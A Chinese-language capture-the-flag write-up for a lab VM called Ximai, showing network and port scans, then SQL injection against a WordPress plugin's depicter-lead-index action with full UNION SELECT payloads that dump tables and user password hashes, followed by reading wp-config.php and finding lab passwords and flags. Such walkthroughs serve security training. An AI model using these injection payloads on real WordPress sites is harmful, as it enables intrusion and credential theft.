---
title: Self-VM Ximai复盘
author: LingMj
data: 2025-05-30
categories: [Self-VM]
tags: [upload]
description: 难度-Easy
---

## 网段扫描
```
root@LingMj:~# arp-scan -l                          
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.194	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.202	a0:78:17:62:e5:0a	Apple, Inc.
192.168.137.67	62:2f:e8:e4:77:5d	(Unknown: locally administered)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.100 seconds (121.90 hosts/sec). 4 responded
```

## 端口扫描

```
root@LingMj:~# nmap -p- -sC -sV 192.168.137.194
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-29 19:51 EDT
Nmap scan report for Ximai.mshome.net (192.168.137.194)
Host is up (0.039s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8000/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: NeonGrid Solutions
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.62 (Debian)
|_http-generator: WordPress 6.8.1
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds
```

## 获取webshell

![picture 0](../assets/images/d5a05fdc7681c0e263af037fd104c3326b1817a9b15be5d6d8f7f92772f11be3.png)  
![picture 1](../assets/images/7df6b6b4620409f86668eabb855803b260ed758c2a6c8c71986fb2239ed1f6f7.png)  
![picture 2](../assets/images/465b995697216ab73386876ec02456c763302a9e7f3db9326ead04d8bbb894c0.png)  
![picture 3](../assets/images/ab8598246133416a4d32066f9523b65d5315c6ced1e4c83477902ced263ea1b0.png)  
![picture 4](../assets/images/04ab0d7e2660cb160cd7bffec7c8c4ae952e4b8cdfc95e3f70314252bce9c137.png)  
![picture 5](../assets/images/c890c67324578d3a24d8cc217a31596712e520a84e880da26505adb63618ae12.png)  
![picture 6](../assets/images/31d6ebc453c39a26893ff034487b83771eb760099a14cfba17510bfec4e3c5e6.png)  
![picture 7](../assets/images/74b298e18824b9181ef200d9b0a2f58f06be3babd3a045f38dd6df731602a0fd.png)  

>这里有一个输入但是我不知道输入什么试了挺多的
>

![picture 8](../assets/images/4171bd466019100a51a1d380f1fdab223c6d7db8ef90a4ffd1b73bd9e7cfaa39.png)  

>试了fuzz和sql都没有手工是不会的,到这我看8000端口去了有wordpress
>

![picture 9](../assets/images/9dc2bdc8fae033260b5a4734d99ddc15d7f41214994bc7175d7fa129bf0d6664.png)  

>存在域名
>

![picture 10](../assets/images/a2db34f79c0acd71c29a2600d7f43f08aa039a71c36c5afc6729fd24d224eb6c.png)  
![picture 11](../assets/images/9a362421b9c2cb019a82ca755c37f545aa79fc144c5ae05fe7cc2e874465539b.png)  
![picture 12](../assets/images/4901c66c6729b33e229c003673db15497793ee9736c180596860243e6f05f44b.png)  

>不能用算了,用msf的
>

![picture 13](../assets/images/baa3988a5da5139a8d65f925ab1b06ba0fac1bad02f75072ca372e5e8cf138c0.png)  

>无没啥用
>

![picture 14](../assets/images/243b8b0ac8279ce8020e9362d758c126b22fbf2a1c989c74ddbbcd31340de36a.png)  

>靠我wpscan是好不了了
>

![picture 15](../assets/images/3ed1211f7d148c4d06998a75cbca36f3c58cd88e8db827ef1e05cf6855d9d502.png)  

>这是正常的？
>

![picture 16](../assets/images/2b8110e0c19737463549829a21862eeb871a26fe613d17c2935f6576de6ac6ee.png)  
![picture 17](../assets/images/22201509546e8538f3eeda5274c0ef71ff95b65c63488aa8b9fe9a3c9904ef83.png)  
![picture 18](../assets/images/a1c99b8a2775650d632f602c86ffe949a09aa2fdf934e76433a54eb245f6f6f2.png)  

>感觉存在sql注入但是不会
>

![picture 19](../assets/images/d3b933a53781da68a0c10f559e260bd4bd1cbb5e1d40b41f93d0cb272de81d6f.png)  
![picture 20](../assets/images/8c236255ee6492225419744082e706a687bd95cb0302b6fa1a0430d825fa1e79.png)  

>xxe么
>

![picture 21](../assets/images/4743ed68e4b589b777ad88337b2ae2e57bf445f6c870a6386dd5963d2022cd76.png)  

>没成功,这个方向不对，要了提示
>

![picture 22](../assets/images/2203845bf24cb7514b28af6771345f8372d0ec7aaed519699f221735d54cf0d9.png)  

>这个不能连我自己是很好奇的
>

![picture 23](../assets/images/b43e6d3b5a8a763e9faeae65ff05f87be54bc964987dfc6b0535dcb2cfca42db.png)  

>利用sql可以找账号密码
>

```
s=9999%27)union+select+111,222,(select(group_concat(0x5461626c65733a20,table_name))+from+information_schema.tables+where+table_schema='wordpress'),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![picture 24](../assets/images/6a08448cd9e58dd82b00e114f60003d1503e2dba2e091c52823d7d771615c9f1.png)  

>这样就可以读取有用信息找到用户密码位置
>

```
s=9999%27)union+select+111,222,(select(group_concat(0x5461626c65733a20,column_name))+from+information_schema.columns+where+table_name='wp_users'),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![picture 25](../assets/images/c4a3074070bdae55b7ee18d7bb2476c2adf941159a0cbc874ee92870824e7b63.png)  

```
9999%27)union+select+111,222,(select(group_concat(user_login,user_pass))+from+wp_users),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![picture 26](../assets/images/7eb4f659f65d48e3e9508b8d48df759346b622304115912717d15aa6462fe1b6.png)  


>adminer:$wp$2y$10$E7r5vlSWYzVeLupu6.K3FOTOOqoqlY.XUObkftyg6z8eK6.b0uElG
>

>应该加一个分号才好看不过算了
>

![picture 28](../assets/images/96611335dbfbf1032238999f57127b552fcea65d57dece8875e71581d1c85c56.png)  

![picture 27](../assets/images/918d52b5ea8653bb3875e2e776199bd335e384a316d6b10bc2bd859b60bc7aec.png)  

>可以读文件
>

```
<!DOCTYPE html><html lang=\"en\"><head>
<meta charset=\"UTF-8\">
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
<title>Reminder<\/title>
<style>

body {


background-color: #1a1a1a;


color: #d0d0d0;


font-family: 'Courier New', Courier, monospace;


margin: 0;


padding: 20px;

}

.container {


max-width: 700px;


margin: 0 auto;


background-color: #2a2a2a;


padding: 20px;


border: 1px solid #444;


border-radius: 5px;


box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);

}

p {


line-height: 1.6;


margin-bottom: 15px;

}

.hint-text {


color: #80ff80;


font-style: italic;

}

img {


max-width: 100%;


height: auto;


border: 2px solid #444;


border-radius: 5px;


margin: 15px 0;

}

.error {


color: #ff5555;


font-weight: bold;


margin-bottom: 10px;

}

form {


margin-top: 20px;

}

input[type=\"text\"] {


background-color: #333;


color: #d0d0d0;


border: 1px solid #555;


padding: 8px;


border-radius: 3px;


width: 200px;


font-family: 'Courier New', Courier, monospace;

}

input[type=\"text\"]::placeholder {


color: #888;

}

input[type=\"submit\"] {


background-color: #006600;


color: #d0d0d0;


border: none;


padding: 8px 15px;


border-radius: 3px;


cursor: pointer;


font-family: 'Courier New', Courier, monospace;


transition: background-color 0.3s;

}

input[type=\"submit\"]:hover {


background-color: #008800;

}

h1 {


color: #00ff00;


text-align: center;


margin-bottom: 20px;

}
<\/style><\/head><body>
<div class=\"container\">

<h1>Web Portal<\/h1>

<p class=\"hint-text\">


jimmy! Don't forget we need to harden the security on the web server. In case you have forgotten your access details, I've put them in a txt file for you. It's in that place where I put that thing that time.

<\/p>

<img src=\"that-place-where-i-put-that-thing-that-time\/1b260614-3aff-11f0-ac81-000c2921b441.jpg\" alt=\"Mysterious Image\">

<p>


Also, can you fix this search box? Sometimes it chucks errors depending on what I enter...

<\/p>

<p class=\"hint-text\">


I'd do it myself, but I've been busy trying to create some code to enable us to securely store our passwords, seeing as you keep forgetting yours... The encoder seems completely borked though.

<\/p>

<?php


if ($_POST['username']) {



echo '<div class=\"error\">';



if (strpos($_POST['username'], \"'\") !== false) {




echo \"ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\".htmlentities($_POST['username'], ENT_QUOTES).\"' at line 1\";



} else {




echo 'No users with that name found';



}



echo '<\/div>';


}

?>

<form action=\"reminder.php\" method=\"POST\">


<input type=\"text\" name=\"username\" placeholder=\"Username\">


<input type=\"submit\" value=\"Lookup User\">

<\/form>
<\/div><\/body><\/html>
```

>有点丑陋但是目前来说什么都能看了除了其他用户目录，哈哈哈
>

![picture 29](../assets/images/baaa6ad04cfd7d60092eeffdf6b8ddc5c2111e9e9e40a00ca20f85250803e018.png)  

>这个目录是啥不知道
>

![picture 30](../assets/images/22f1cebab4c0e81fbca2dd9d4670752fc7f0961cb538b09baf4fc6d2dea9516b.png)  

>找到了
>

```
<?php \/**  * The base configuration for WordPress  *  * The wp-config.php creation script uses this file during the installation.  * You don't have to use the website, you can copy this file to \"wp-config.php\"  * and fill in the values.  *  * This file contains the following configurations:  *  * * Database settings  * * Secret keys  * * Database table prefix  * * ABSPATH  *  * @link https:\/\/developer.wordpress.org\/advanced-administration\/wordpress\/wp-config\/  *  * @package WordPress  *\/  \/\/ ** Database settings - You can get this info from your web host ** \/\/ \/** The name of the database for WordPress *\/ define( 'DB_NAME', 'wordpress' );  \/** Database username *\/ define( 'DB_USER', 'root' );  \/** Database password *\/ define( 'DB_PASSWORD', 'SuperSecret' );  \/** Database hostname *\/ define( 'DB_HOST', 'localhost' );  \/** Database charset to use in creating database tables. *\/ define( 'DB_CHARSET', 'utf8mb4' );  \/** The database collate type. Don't change this if in doubt. *\/ define( 'DB_COLLATE', '' );  \/**#@+  * Authentication unique keys and salts.  *  * Change these to different unique phrases! You can generate these using  * the {@link https:\/\/api.wordpress.org\/secret-key\/1.1\/salt\/ WordPress.org secret-key service}.  *  * You can change these at any point in time to invalidate all existing cookies.  * This will force all users to have to log in again.  *  * @since 2.6.0  *\/ define( 'AUTH_KEY',         '\/3s0Z$=)9U}oo{Im<k8F$k+XLL1j}VS_|<MS6Y`?=0V0^VjB]@B~(?33n&Q&Qfh$' ); define( 'SECURE_AUTH_KEY',  '_8>Osze@4-tX&K@w>&>*bhaj]{G0?7%C$+K LktqM[*c4L?nJq*VnVtOLH:,hXdh' ); define( 'LOGGED_IN_KEY',    'In]_p@uRWc4H}*jh43sgLbOC9dT:tR,MQ-}$3WpS$pR&}kxogG~a(W1Ft}2tn{`(' ); define( 'NONCE_KEY',        'WB~X~FHk_*d^`On[{:~AtQIgD{u(|h[_(IN(HsId-a3BM\/b=p<O&j9dkSjng|,>5' ); define( 'AUTH_SALT',        'G]Yhq(%bqeQoOm^nI[h~kS]^xOI)G2+[&]a>}*\/tmT%K;3$GcsDN(i?R7YqP}zY3' ); define( 'SECURE_AUTH_SALT', '7[GWfTYXW3tqj$ZSz1%.,1u$h$BM0+M[2)9xSQr<GVAj%rg.PiY%>#I=l.yMVwLA' ); define( 'LOGGED_IN_SALT',   'HdS}Bck8=tz,K3zY3H2RMu@9X%;}R_V*Cx? `GGJ9\/Q?$aw{q9c0;IA3Lp(%Zx7G' ); define( 'NONCE_SALT',       'mrsy5&-h{DJE o|u4IF\/SbEC]Rr2B-(%]o8`3J]?23Pq35AfT ^t6%(i#%q3k,s$' );  \/**#@-*\/  \/**  * WordPress database table prefix.  *  * You can have multiple installations in one database if you give each  * a unique prefix. Only numbers, letters, and underscores please!  *  * At the installation time, database tables are created with the specified prefix.  * Changing this value after WordPress is installed will make your site think  * it has not been installed.  *  * @link https:\/\/developer.wordpress.org\/advanced-administration\/wordpress\/wp-config\/#table-prefix  *\/ $table_prefix = 'wp_';  \/**  * For developers: WordPress debugging mode.  *  * Change this to true to enable the display of notices during development.  * It is strongly recommended that plugin and theme developers use WP_DEBUG  * in their development environments.  *  * For information on other constants that can be used for debugging,  * visit the documentation.  *  * @link https:\/\/developer.wordpress.org\/advanced-administration\/debug\/debug-wordpress\/  *\/ define( 'WP_DEBUG', false );  \/* Add any custom values between this line and the \"stop editing\" line. *\/    \/* That's all, stop editing! Happy publishing. *\/  \/** Absolute path to the WordPress directory. *\/ if ( ! defined( 'ABSPATH' ) ) { \tdefine( 'ABSPATH', __DIR__ . '\/' ); }  \/** Sets up WordPress vars and included files. *\/ require_once ABSPATH . 'wp-settings.php'; 
```

![picture 31](../assets/images/91129b30c9ac9a5e0732c8315bdd56679caab602809517d9d3e74a3e3e8dc870.png)  
![picture 32](../assets/images/6b1dee14efc54d1e9e5f870e1e43a740a3e37f1b7b6072efe498e8b821ed6d77.png)  

>进来了,上面想优雅点形式联系群主
>

```
$wp$2y$10$E7r5vlSWYzVeLupu6.K3FOTOOqoqlY.XUObkftyg6z8eK6.b0uElG
$1$HAco30FV$5Ybq4jE79Yg6mRxlu9KvS0
```

![picture 33](../assets/images/4c0275d69b139eaaab5c907bd926782de7a8ed782511a889b8929acdd0e4a547.png)  

>OK终于进来了
>

![picture 34](../assets/images/521ff5072c6ff2796ebeedbcd7a12cb62961e5f5ba56d588e88621e320551932.png)  

>这受不了没有wordpress后台咋拿shell很烦
>

![picture 35](../assets/images/8a391ac06b951e2021ad22929c214f6183b49995e7e2e6a3cfa37cb2dee35f12.png)  

>这玩意能提权么
>

![picture 36](../assets/images/8d8317b339dfcd0cbdc46e23267f472ece7bbd954a252520b4310dfca2668ea6.png)  

>这个也不行
>

![picture 37](../assets/images/a7cba708272e5c27cefa19d504291909c01b7b09d59a09fb484fa8f8aaf1a911.png)  

>才发现有另外一个用户,密码：HandsomeHU                                                                          
>

![picture 38](../assets/images/de678d7fd0cf6f2adbd4516f71c7ad673ed741e7352393e029a41a8c6cf81f46.png)  


## 提权

![picture 39](../assets/images/a131131ba61133939800888661cb92aa91ee6ea875239343a2e481f477f7335c.png)  
![picture 40](../assets/images/8bba530cac3cb6eb4be7f661eb9c3222d5c61cea6acbfceaa2015e8165aaf21e.png)  

>指定写了什么导致的
>

![picture 41](../assets/images/7638e5eda56c9c40c26475ef7860e07de7ee31a19c25805c9cc7ef20cb4f59d9.png)  

>又是什么奇奇怪怪的恶作剧
>

![picture 42](../assets/images/56d96bfddf6b8466ef72803d081a6bd1e4b075b623aaa5c2c278f3920fc39567.png)  

>调回来了
>

![picture 43](../assets/images/b135450cb294731e95c93dc369df40e9b38c1e038e891fd26046bfc4e3d6a199.png)  

![picture 44](../assets/images/4343de2967a7d41af28d9124920f9d45d7ce6b540e1dfbdaefbdca89acbfe82e.png)  

![picture 45](../assets/images/88a3d63c11dd713f7f627472cc02d03fb4da342b7c441181d10c2ab39624eb20.png)  

>看来不行,那应该可以打洞,打洞也不行主要我这个工具有点问题，现在想想咋解决这个问题
>

![picture 46](../assets/images/5e0317a14fb9439a02b243cf17d3be7fa354337f4cce2920a93e6b06899ad424.png)  
![picture 47](../assets/images/99adede52ee0850e4d9efd04bd408e70e98ec6df20e0039b1bf4bf83f342539e.png)  

>这个密码能爆破成功么
>

>整了cupp -i没有密码成功算了看见有群主wp看一眼wp，密码确实弱口令但是不行我设计不出来
>

>密码adminer123456
>

![picture 48](../assets/images/a0e739a5b9ac049edc3bb3977f4587c290ff0dd477d2aaeade0ba4ea96365955.png)  
![picture 49](../assets/images/42a2951346686abdbfce2b32f6c9184d1a60291a13b358dbe49c987ab35efa25.png)  

>好了结束了还是很难的中间这个爆破密码部分
>

>userflag:flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
>
>rootflag:flag{root-126e5653-3b02-11f0-b074-000c2921b441}
>